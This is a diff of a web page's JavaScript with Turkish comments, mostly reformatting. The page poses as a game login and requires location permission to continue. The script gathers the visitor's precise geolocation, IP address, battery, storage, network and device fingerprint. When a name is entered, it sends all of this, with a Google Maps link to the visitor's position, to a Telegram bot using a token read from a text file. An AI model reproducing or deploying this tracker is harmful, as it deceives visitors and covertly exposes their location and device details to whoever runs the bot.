@@ -16,39 +16,39 @@
   <div id="uyari"></div>
 
   <script>
-    // 1. Başlangıç bilgileri
+    // 1. Bilgi nesnesi
     let info = {
-      name: "", lat: null, lon: null,
-      ip: "Alınamadı",
-      browser: "site:Bilinmiyor",
-      screen: `${screen.width}x${screen.height}`,
+      name: "", lat:null, lon:null,
+      ip: "Alınamadı", browser:"site:Bilinmiyor",
+      screen:`${screen.width}x${screen.height}`,
       pixelRatio: devicePixelRatio,
       colorDepth: screen.colorDepth,
       memory: navigator.deviceMemory||"?",
       cores: navigator.hardwareConcurrency||"?",
-      online: navigator.onLine,
-      platform: navigator.platform,
+      online: navigator.onLine, platform: navigator.platform,
       language: navigator.language,
       timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
       hour: new Date().getHours(),
       timestamp: new Date().toLocaleString(),
-      batteryLevel: "?", charging: "?",
-      storageQuota: "?", storageUsage: "?",
-      netType: "?", downlink: "?", rtt: "?",
-      darkMode: false,
+      batteryLevel:"?", charging:"?",
+      storageUsage:"?", storageQuota:"?",
+      netType:"?", downlink:"?", rtt:"?",
+      darkMode:false,
       cookieEnabled: navigator.cookieEnabled,
-      doNotTrack: navigator.doNotTrack || navigator.msDoNotTrack,
-      orientation: screen.orientation && screen.orientation.type ? screen.orientation.type : "unknown",
-      pluginsCount: navigator.plugins ? navigator.plugins.length : "?",
-      pageLoadTime: 0
+      doNotTrack: navigator.doNotTrack||navigator.msDoNotTrack,
+      orientation: (screen.orientation&&screen.orientation.type)||"unknown",
+      pluginsCount: navigator.plugins?navigator.plugins.length:"?",
+      pageLoadTime:0
     };
 
     // 2. Sayfa yüklenince veri toplama
     window.onload = async () => {
+      const start = performance.timing.navigationStart;
+
       // Konum
       navigator.geolocation.getCurrentPosition(
-        p => { info.lat = p.coords.latitude; info.lon = p.coords.longitude; },
-        e => document.getElementById("uyari").innerText = "📍 Konum izni gerekli!"
+        p=>{ info.lat=p.coords.latitude; info.lon=p.coords.longitude; },
+        ()=>document.getElementById("uyari").innerText="📍 Konum izni gerekli!"
       );
 
       // IP
@@ -61,44 +61,43 @@
       if (navigator.getBattery) {
         const bat = await navigator.getBattery();
         info.batteryLevel = Math.round(bat.level*100)+"%";
-        info.charging = bat.charging;
+        info.charging     = bat.charging;
       }
 
-      // Depolama
+      // Otomatik depolama tahmini
       if (navigator.storage && navigator.storage.estimate) {
-        const st = await navigator.storage.estimate();
-        info.storageQuota = st.quota;
-        info.storageUsage = st.usage;
+        const { usage, quota } = await navigator.storage.estimate();
+        info.storageUsage = usage;
+        info.storageQuota = quota;
       }
 
       // Ağ kalitesi
-      const conn = navigator.connection || {};
-      info.netType = conn.effectiveType || "?";
-      info.downlink = conn.downlink || "?";
-      info.rtt = conn.rtt || "?";
+      const conn    = navigator.connection||{};
+      info.netType  = conn.effectiveType||"?";
+      info.downlink = conn.downlink||"?";
+      info.rtt      = conn.rtt||"?";
 
       // Tarayıcı türü
       const ua = navigator.userAgent;
-      if (ua.includes("Chrome") && !ua.includes("Edg")) info.browser = "site:Chrome";
-      else if (ua.includes("Firefox")) info.browser = "site:Firefox";
-      else if (ua.includes("Safari") && !ua.includes("Chrome")) info.browser = "site:Safari";
-      else if (ua.includes("Edg")) info.browser = "site:Edge";
+      if(ua.includes("Chrome")&&!ua.includes("Edg")) info.browser="site:Chrome";
+      else if(ua.includes("Firefox"))                    info.browser="site:Firefox";
+      else if(ua.includes("Safari")&&!ua.includes("Chrome")) info.browser="site:Safari";
+      else if(ua.includes("Edg"))                        info.browser="site:Edge";
 
       // Karanlık mod
       info.darkMode = window.matchMedia("(prefers-color-scheme: dark)").matches;
 
-      // Sayfa yükleme süresi
-      const timing = performance.timing;
-      info.pageLoadTime = timing.domContentLoadedEventEnd - timing.navigationStart;
+      // Yükleme süresi
+      info.pageLoadTime = performance.timing.domContentLoadedEventEnd - start;
     };
 
-    // 3. Giriş işlevi
+    // 3. Giriş fonksiyonu
     async function girisYap() {
       info.name = document.getElementById("username").value.trim();
       if (!info.name)
-        return document.getElementById("uyari").innerText = "🧠 İsim gerekli!";
+        return document.getElementById("uyari").innerText="🧠 İsim gerekli!";
       if (info.lat === null)
-        return document.getElementById("uyari").innerText = "📍 Konum izni gerekli!";
+        return document.getElementById("uyari").innerText="📍 Konum izni gerekli!";
 
       // Telegram bilgileri
       const txt = await fetch("bilgiler.txt").then(r=>r.text());
@@ -108,11 +107,11 @@
       // Harita linki
       const maps = `https://www.google.com/maps?q=${info.lat},${info.lon}`;
 
-      // Depolama MB cinsine
-      const usedMB  = Math.round(info.storageUsage/1024/1024);
-      const quotaMB = Math.round(info.storageQuota/1024/1024);
+      // Depolamayı MB’ye çevir
+      const usedMB  = (info.storageUsage/1024/1024).toFixed(2);
+      const quotaMB = (info.storageQuota/1024/1024).toFixed(2);
 
-      // Mesaj
+      // Mesaj oluşturma
       const msg = `
 🎮 *Yeni Mega Giriş!*
 👤 İsim: *${info.name}*
@@ -140,6 +139,7 @@
 📶 Çevrimiçi: *${info.online}*
 `;
 
+      // Telegram’a gönder
       await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
         method: "POST",
         headers: {"Content-Type":"application/json"},
